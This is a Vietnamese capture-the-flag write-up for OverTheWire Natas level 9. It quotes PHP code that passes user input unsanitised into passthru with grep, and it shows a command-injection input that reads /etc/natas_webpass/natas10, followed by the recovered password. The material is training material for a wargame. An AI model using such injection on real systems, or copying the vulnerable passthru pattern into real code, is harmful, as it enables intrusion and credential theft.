## Natas

> Category: Leve8-Level9
>
> Point:
>
> URL: http://overthewire.org/wargames/natas/

### Write-up

- **URL**: http://natas9.natas.labs.overthewire.org/

- **Description**: 

<p align="center"><img src="https://github.com/TrinhTu/web_developer/blob/master/Task31_CTF_OverTheWire_Natas/image/17.png"/></p>

- **Solution**:

	+ Trong source chưa đoạn code sau:

```javascript
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

- Điều này có nghĩa nếu giá trị truyền vào khác $key thì nó sẽ thực hiện hàm `passthru("grep -i $key dictionary.txt");` , hàm `passthru` có tác dụng thực hiện 1 chương trình bên ngoài và hiển thị ra kết quả

- Còn `grep -i` tức là nó sẽ in ra các $key tìm trong thư mục dictionary.txt không phân biệt chữ hoa hay chữ thường.

- Trong phần đầu đã được đề cập tới là tất cả password của natas sẽ nằm trong thư mục đường dẫn `/etc/natas_webpass/`

<p align="center"><img src="https://github.com/TrinhTu/web_developer/blob/master/Task31_CTF_OverTheWire_Natas/image/18.png"/></p>

- Vậy ta sẽ cat để tìm password của natas10 thực hiện đồng thời cả 2 câu lệnh:

`grep -i ; cat /etc/natas_webpass/natas10`
	
<p align="center"><img src="https://github.com/TrinhTu/web_developer/blob/master/Task31_CTF_OverTheWire_Natas/image/19.png"/></p>

- Vậy pass là: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`